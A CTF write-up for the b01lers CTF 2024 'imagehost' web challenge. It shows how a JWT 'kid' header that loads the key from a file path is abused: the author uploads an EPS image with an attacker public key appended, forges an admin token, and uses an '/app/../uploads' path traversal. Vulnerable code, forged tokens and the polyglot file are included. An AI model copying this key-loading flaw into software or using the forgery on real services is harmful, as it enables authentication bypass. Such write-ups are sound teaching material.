---
title: "imagehost - b01lers CTF 2024"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "image", "path-traversal", "jwt", "imagehost", "lfi", "b01lers-ctf", "b01lers-ctf-2024", "2024", "ctf-writeup"]
summary: "In this zip file there is a python implementation of an imagehost web server."
source:
  name: "CTFtime writeup #39145"
  url: "https://ctftime.org/writeup/39145"
ctf:
  name: "b01lers CTF 2024"
  year: 2024
  challenge: "imagehost"
---

## Metadata

- **CTF:** b01lers CTF 2024
- **Task:** imagehost
- **Author team:** nohackspace
- **CTFtime tags:** web, image
- **CTFtime:** <https://ctftime.org/writeup/39145>

---
Attachments:  
* imagehost.zip

In this zip file there is a python implementation of an imagehost web server.  
This implementation contains code for session handling via JSON Web Tokens:  
```python  
from pathlib import Path

import jwt

def encode(payload, public_key: Path, private_key: Path):  
key = private_key.read_bytes()  
return jwt.encode(payload=payload, key=key, algorithm="RS256", headers={"kid": str(public_key)})

def decode(token):  
headers = jwt.get_unverified_header(token)  
public_key = Path(headers["kid"])  
if public_key.absolute().is_relative_to(Path.cwd()):  
key = public_key.read_bytes()  
return jwt.decode(jwt=token, key=key, algorithms=["RS256"])  
else:  
return {}  
```

Creating a token via login produces something like this  
```  
eyJhbGciOiJSUzI1NiIsImtpZCI6InB1YmxpY19rZXkucGVtIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjozLCJhZG1pbiI6bnVsbH0.O46AMfAsFuXqRNkf00FrDYGQN1lqt7M3gAExp-RXv7C1Po4TUNnnnpb_DR8UrrBYIfn1kvXBxQzXr2EqJduh67fs3MRGaYXmSyLkQ26QBDfuF-L6A89e4g5Jf4qE3jirp210i1q2374vqVW9VeCoP7hfkLlPuSK5VDAm8BfDaSRF4odWH1klpT_fo03NsVpahg1H0sgak0lDvAssVXcbhZ-8KRo64QOcL8tKjZzbCsoll-rfxgyKdGRyLgVxBRw6Kay1ei_dG6j7mNGnQupNr8fy9IdCexEOABjAHoI640cujOl7z0g2SUB4tzG7txVbRm15jcysBvD_NVonvoE3VGUgbSg_V5lkj5ofLNWCh9jN7hlj6xEXql3QzsVWJQHgYm5dpEuoxizXdozqvi6AOKn6SR5BG1jHYs1XCnSW5XnqbO6OBfTdSTYas1lRJ-NCzsvJs3wYEbjHJp9CDMA9NCJJVDTZ7EkMyhrN7CJH8LHGU8ZrTkqKFKl3_bQeQWmgfI9URIatlLafnk8aw7YkOU4gkXJqZvtwpfaMYF8GgIujeVM7I8c11jPF-k58OAM7lUOOpBsK_fW9JQQ9_VZqF6pJltKpwR3I-saRcyL3p6M-3CpwWI2FS4bqfkcQDj9wuqxEF45uP-wn3TyqAteV1wX_Ei7N5uVNQ8cHSFIigPI  
```  
This can be decoded via <https://jwt.io/>  
The header  
```  
{  
"alg": "RS256",  
"kid": "public_key.pem",  
"typ": "JWT"  
}  
```  
The payload  
```  
{  
"user_id": 3,  
"admin": null  
}  
```

We suspect that we can upload our own public key pretending it is an image file.   
We will sign our payload containing the admin user_id, with a known private key. Then use our own public key to check the signature.

For signing our own payload  
Public Key:

```  
\-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr79D8wfWGTEBR5z/hSI6  
W799WS+kCZoYw0UqooJQ5nzld1mGwgNW+yNyxHdDaBfxjFtetW6anDaissUpQqRl  
jVRIvt3Mo85t4pgoRJEiUFQ6YtsLaUXax/ZMaYmhilf7IvlkEX9fn6bPlpBOqGFe  
4FhrEhyt38rOiBtAxWm0pcRyWHZ+LuCbmJu41+AGTzfNiGFWJSQ7yN0w5sASpdkN  
U+mdYez2CbyqrQdPRJtilLdFzggFYiVD8EfabsOTTKUkIi+Zgg8MRRvMm+xYIxex  
4Vawf8devya18NRoN+aIahCdA753hpAcuDldzUEtPytuS+1946+KUdpPFWiKUgaM  
YQIDAQAB  
\-----END PUBLIC KEY-----  
```

Private Key:  
```  
\[REDACTED-PRIVATE-KEY-BLOCK]  
```

The modified header:  
```  
{  
"alg": "RS256",  
"kid": "/a/our_own_public_key.pem",  
"typ": "JWT"  
}  
```

The modified session payload  
```  
{  
"user_id": 1,  
"admin": null  
}  
```  
We can create the needed token with the [token.py](http://token.py) functions given by the task source

```  
>>> from pathlib import Path  
>>> encode({"user_id": 1, "admin": True}, Path('../../public_key.pem'), Path('../../private_key.pem'))  
'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uL3B1YmxpY19rZXkucGVtIn0.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6dHJ1ZX0.oGlGsmuASM6q4oxmhMVXVscY0xZyBnex8W5VuKPBWlporlGgrn9LdoHqi4aLel6P1VxRvCDptRX9_tmNQzcUSTl3fLkPkrIUAFb-Wf0ZHpIsQ6j2_kmTEZMoenr72B6G9MUg4Z_qh1Y8JM5DtTENWpC1pM_KfKGJorfT_6wgseaBxvm7PDDQyuPAVD4gAY0PUR2_VJH3M4h94e0c2Gc2sIh-ZjbRyDnhVN9qaM0z54gNbHklEIPlrHt2PxoxC3yowbR9aFV0kdy9fk54EtFIpOKVGj84Bs3Q3rXnILvLr1KEryiw4wyqSJ2cSkeiuAikXCpd-_SGsw_DU1Xdng6FsA'  
```  
We created + uploaded postscript 1x1p image with public key attached  
```  
%!PS-Adobe-3.0 EPSF-3.0  
%%Creator: GIMP PostScript file plug-in V 1,17 by Peter Kirchgessner  
%%Title: evil.eps  
%%CreationDate: Sun Apr 14 02:06:11 2024  
%%DocumentData: Clean7Bit  
%%LanguageLevel: 2  
%%Pages: 1  
%%BoundingBox: 14 14 15 15  
%%EndComments  
%%BeginProlog  
% Use own dictionary to avoid conflicts  
10 dict begin  
%%EndProlog  
%%Page: 1 1  
% Translate for offset  
14.173228346456694 14.173228346456694 translate  
% Translate to begin of first scanline  
0 0.24000000000000002 translate  
0.24000000000000002 -0.24000000000000002 scale  
% Image geometry  
1 1 8  
% Transformation matrix  
[ 1 0 0 1 0 0 ]  
% Strings to hold RGB-samples per scanline  
/rstr 1 string def  
/gstr 1 string def  
/bstr 1 string def  
{currentfile /ASCII85Decode filter /RunLengthDecode filter rstr readstring pop}  
{currentfile /ASCII85Decode filter /RunLengthDecode filter gstr readstring pop}  
{currentfile /ASCII85Decode filter /RunLengthDecode filter bstr readstring pop}  
true 3  
%%BeginData: 32 ASCII Bytes  
colorimage  
!<7Q~>  
!<7Q~>  
!<7Q~>  
%%EndData  
showpage  
%%Trailer  
end  
%%EOF

\-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr79D8wfWGTEBR5z/hSI6  
W799WS+kCZoYw0UqooJQ5nzld1mGwgNW+yNyxHdDaBfxjFtetW6anDaissUpQqRl  
jVRIvt3Mo85t4pgoRJEiUFQ6YtsLaUXax/ZMaYmhilf7IvlkEX9fn6bPlpBOqGFe  
4FhrEhyt38rOiBtAxWm0pcRyWHZ+LuCbmJu41+AGTzfNiGFWJSQ7yN0w5sASpdkN  
U+mdYez2CbyqrQdPRJtilLdFzggFYiVD8EfabsOTTKUkIi+Zgg8MRRvMm+xYIxex  
4Vawf8devya18NRoN+aIahCdA753hpAcuDldzUEtPytuS+1946+KUdpPFWiKUgaM  
YQIDAQAB  
\-----END PUBLIC KEY-----

```  
We can exploit a path traversal vulnerability using "/app/../uploads" (must start with /app)  
We then change the jwt header path to the given upload path and can login using the generated admin jwt token.

Flag: `bctf{should've_used_imgur}`
